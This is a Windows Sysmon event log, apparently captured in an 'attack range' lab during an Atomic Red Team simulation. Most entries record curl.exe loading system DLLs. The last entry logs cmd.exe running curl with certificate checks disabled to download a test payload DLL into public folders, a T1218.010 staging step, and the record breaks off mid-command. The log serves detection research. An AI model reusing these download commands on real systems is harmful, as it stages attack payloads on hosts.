<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.324896000Z'/><EventRecordID>34354171</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.323</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\gdi32.dll</Data><Data Name='FileVersion'>10.0.14393.4169 (rs1_release.210107-1130)</Data><Data Name='Description'>GDI Client DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>gdi32</Data><Data Name='Hashes'>MD5=551D603CEC947F586DB9FADEF4D2EBA6,SHA256=143125EFF9F3BC5B3F3BE505F3C3814393807B9CACB6AA5F75D39C77EC0D4ED8</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.324631000Z'/><EventRecordID>34354170</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.323</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\win32u.dll</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>Win32u</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Win32u.DLL</Data><Data Name='Hashes'>MD5=6A40F9C63B52CB4E8271CF3418618033,SHA256=A2BE23DA7AADFA9118130C939CD59D86E590957172FF404511EE6C5EC5147F15</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.324331600Z'/><EventRecordID>34354169</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.323</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\user32.dll</Data><Data Name='FileVersion'>10.0.14393.4169 (rs1_release.210107-1130)</Data><Data Name='Description'>Multi-User Windows USER API Client DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>user32</Data><Data Name='Hashes'>MD5=883B59C5557E8A9B3C1E1ED1CA48CD5A,SHA256=271800C20A96587265BF83DE2EFC11329EEB2B6C0D57E5E0BCD137FB96BFE6E3</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.324096100Z'/><EventRecordID>34354168</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.323</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\msasn1.dll</Data><Data Name='FileVersion'>10.0.14393.0 (rs1_release.160715-1616)</Data><Data Name='Description'>ASN.1 Runtime APIs</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>msasn1.dll</Data><Data Name='Hashes'>MD5=299464D218A27B56684B715365D149FE,SHA256=2BFE4014E06552A9D4201EF9D1C605694AAF2B7B811265EFD91FC6D1C2D48242</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.323851600Z'/><EventRecordID>34354167</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.322</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\ucrtbase.dll</Data><Data Name='FileVersion'>10.0.14393.3659 (rs1_release_1.200410-1813)</Data><Data Name='Description'>Microsoft® C Runtime Library</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>ucrtbase.dll</Data><Data Name='Hashes'>MD5=9804D130E8E7178738C2B9808091B427,SHA256=6053B7CC85846F15094475116A8C57BA89FE99FDD1978C54E8A7E2114E318FE3</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.323445600Z'/><EventRecordID>34354166</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.322</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\crypt32.dll</Data><Data Name='FileVersion'>10.0.14393.4350 (rs1_release.210407-2154)</Data><Data Name='Description'>Crypto API32</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CRYPT32.DLL</Data><Data Name='Hashes'>MD5=95BA70CFA8087A209500D7D350BF3A59,SHA256=4265157E8DC2A0E32A6328D54181CC31FD24E3017E60B270623C2CDBE5FAB4FA</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.322782500Z'/><EventRecordID>34354165</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.321</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\rpcrt4.dll</Data><Data Name='FileVersion'>10.0.14393.4467 (rs1_release.210604-1844)</Data><Data Name='Description'>Remote Procedure Call Runtime</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>rpcrt4.dll</Data><Data Name='Hashes'>MD5=B0C4BF9491FB453B77399E3C56C11DC8,SHA256=66D5D1B3D25D15EA8737C8B2EF83E770BA10931868F24DCACC50936F0A0BAC08</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.322455200Z'/><EventRecordID>34354164</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.321</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\sechost.dll</Data><Data Name='FileVersion'>10.0.14393.3808 (rs1_release.200707-2105)</Data><Data Name='Description'>Host for SCM/SDDL/LSA Lookup APIs</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>sechost.dll</Data><Data Name='Hashes'>MD5=E6B98644CD3B912C44C39CC0996790A9,SHA256=23BE56E1B8DBA449C0959753175BD15457EC88E93E9E8B86489266347959A6F2</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.322146400Z'/><EventRecordID>34354163</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.321</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\msvcrt.dll</Data><Data Name='FileVersion'>7.0.14393.2457 (rs1_release_inmarket.180822-1743)</Data><Data Name='Description'>Windows NT CRT DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>msvcrt.dll</Data><Data Name='Hashes'>MD5=0AF8989DD67A135B536CF948E3EFB7EB,SHA256=C693DA0EF4DCF3BC244661B9FD280FE12C3053FDD7B977712C0CF210831B2EF4</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.321657300Z'/><EventRecordID>34354162</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.320</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\advapi32.dll</Data><Data Name='FileVersion'>10.0.14393.4467 (rs1_release.210604-1844)</Data><Data Name='Description'>Advanced Windows 32 Base API</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>advapi32.dll</Data><Data Name='Hashes'>MD5=A8CDCAC5C32D14ED8AADDF5489FC5D55,SHA256=140F07A8F6780DAFE20CC4FBE86C9332FB2F0C26ED8F49914BD05265C63EF6F1</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.320806900Z'/><EventRecordID>34354161</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.320</Data><Data Name='SourceProcessGUID'>{8B6011A9-C6FA-616E-9C35-01000000F101}</Data><Data Name='SourceProcessId'>4136</Data><Data Name='SourceThreadId'>5516</Data><Data Name='SourceImage'>C:\Windows\system32\conhost.exe</Data><Data Name='TargetProcessGUID'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='TargetProcessId'>3804</Data><Data Name='TargetImage'>C:\Windows\System32\Curl.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+a6134|C:\Windows\SYSTEM32\ConhostV2.dll+5ca7|C:\Windows\SYSTEM32\ConhostV2.dll+774b|C:\Windows\SYSTEM32\ConhostV2.dll+a8ef|C:\Windows\System32\KERNEL32.DLL+84d4|C:\Windows\SYSTEM32\ntdll.dll+51781</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.320272800Z'/><EventRecordID>34354160</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.319</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\KernelBase.dll</Data><Data Name='FileVersion'>10.0.14393.4350 (rs1_release.210407-2154)</Data><Data Name='Description'>Windows NT BASE API Client DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Kernelbase.dll</Data><Data Name='Hashes'>MD5=0F627827D9CFFA8E0BCF30F013FB7209,SHA256=EA47C3E471801ACA92EE449C66CF785EA670ADE92A5A2D5CDB81C93DD72ABEF0</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.320052900Z'/><EventRecordID>34354159</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.319</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\kernel32.dll</Data><Data Name='FileVersion'>10.0.14393.4350 (rs1_release.210407-2154)</Data><Data Name='Description'>Windows NT BASE API Client DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>kernel32</Data><Data Name='Hashes'>MD5=A5AD62615D2361BFAEC6C047B199184C,SHA256=B43F3DFDAF7BAA7A2B97015631F96CE429C50348D380080CFC29C36F959D7886</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.319337700Z'/><EventRecordID>34354158</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.318</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\ntdll.dll</Data><Data Name='FileVersion'>10.0.14393.4530 (rs1_release.210705-0736)</Data><Data Name='Description'>NT Layer DLL</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>ntdll.dll</Data><Data Name='Hashes'>MD5=36B87C41EE39F3051D116F735EBEF866,SHA256=9C45BAE6D7E27B3AE04BBF88B96686C04ED6A43695558E82B687013BA0383F8A</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>7</EventID><Version>3</Version><Level>4</Level><Task>7</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.318969100Z'/><EventRecordID>34354157</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.318</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\Curl.exe</Data><Data Name='FileVersion'>7.79.1</Data><Data Name='Description'>The curl executable</Data><Data Name='Product'>The curl executable</Data><Data Name='Company'>curl, https://curl.se/</Data><Data Name='OriginalFileName'>curl.exe</Data><Data Name='Hashes'>MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528</Data><Data Name='Signed'>false</Data><Data Name='Signature'>-</Data><Data Name='SignatureStatus'>Unavailable</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>25</EventID><Version>5</Version><Level>4</Level><Task>25</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.318582000Z'/><EventRecordID>34354156</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.317</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='Type'>Image is replaced</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.318266200Z'/><EventRecordID>34354155</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.317</Data><Data Name='SourceProcessGUID'>{8B6011A9-888A-6164-7000-00000000F101}</Data><Data Name='SourceProcessId'>3448</Data><Data Name='SourceThreadId'>3444</Data><Data Name='SourceImage'>C:\Windows\system32\csrss.exe</Data><Data Name='TargetProcessGUID'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='TargetProcessId'>3804</Data><Data Name='TargetImage'>C:\Windows\System32\Curl.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+a6134|C:\Windows\system32\basesrv.DLL+2f47|C:\Windows\SYSTEM32\CSRSRV.dll+5645|C:\Windows\SYSTEM32\ntdll.dll+5178f</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>10</EventID><Version>3</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.318167100Z'/><EventRecordID>34354154</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.316</Data><Data Name='SourceProcessGUID'>{8B6011A9-F329-616E-043B-01000000F101}</Data><Data Name='SourceProcessId'>2936</Data><Data Name='SourceThreadId'>2664</Data><Data Name='SourceImage'>C:\Windows\system32\cmd.exe</Data><Data Name='TargetProcessGUID'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='TargetProcessId'>3804</Data><Data Name='TargetImage'>C:\Windows\System32\Curl.exe</Data><Data Name='GrantedAccess'>0x1fffff</Data><Data Name='CallTrace'>C:\Windows\SYSTEM32\ntdll.dll+a7404|C:\Windows\System32\KERNELBASE.dll+2b860|C:\Windows\System32\KERNELBASE.dll+6b246|C:\Windows\System32\KERNEL32.DLL+1c213|C:\Windows\system32\cmd.exe+f1e1|C:\Windows\system32\cmd.exe+11a37|C:\Windows\system32\cmd.exe+cb0d|C:\Windows\system32\cmd.exe+c295|C:\Windows\system32\cmd.exe+8564|C:\Windows\system32\cmd.exe+c347|C:\Windows\system32\cmd.exe+c347|C:\Windows\system32\cmd.exe+c347|C:\Windows\system32\cmd.exe+f916|C:\Windows\system32\cmd.exe+1510d|C:\Windows\System32\KERNEL32.DLL+84d4|C:\Windows\SYSTEM32\ntdll.dll+51781</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2021-10-19T16:32:42.317825000Z'/><EventRecordID>34354153</EventRecordID><Correlation/><Execution ProcessID='2856' ThreadID='2088'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>win-dc-469.attackrange.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2021-10-19 16:32:42.317</Data><Data Name='ProcessGuid'>{8B6011A9-F32A-616E-073B-01000000F101}</Data><Data Name='ProcessId'>3804</Data><Data Name='Image'>C:\Windows\System32\Curl.exe</Data><Data Name='FileVersion'>7.79.1</Data><Data Name='Description'>The curl executable</Data><Data Name='Product'>The curl executable</Data><Data Name='Company'>curl, https://curl.se/</Data><Data Name='OriginalFileName'>curl.exe</Data><Data Name='CommandLine'>C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\2\</Data><Data Name='User'>ATTACKRANGE\Administrator</Data><Data Name='LogonGuid'>{8B6011A9-8897-6164-CBF3-050000000000}</Data><Data Name='LogonId'>0x5f3cb</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=46A8FE9CE08112D542220E850323D334,SHA256=7F43DE7FB365D85CF8FEE0EC66D43B09FB3D559B02A432E5925E3748BC3BD528</Data><Data Name='ParentProcessGuid'>{8B6011A9-F329-616E-043B-01000000F101}</Data><Data Name='ParentProcessId'>2936</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll &amp; C:\Windows\System32\Curl.exe -k 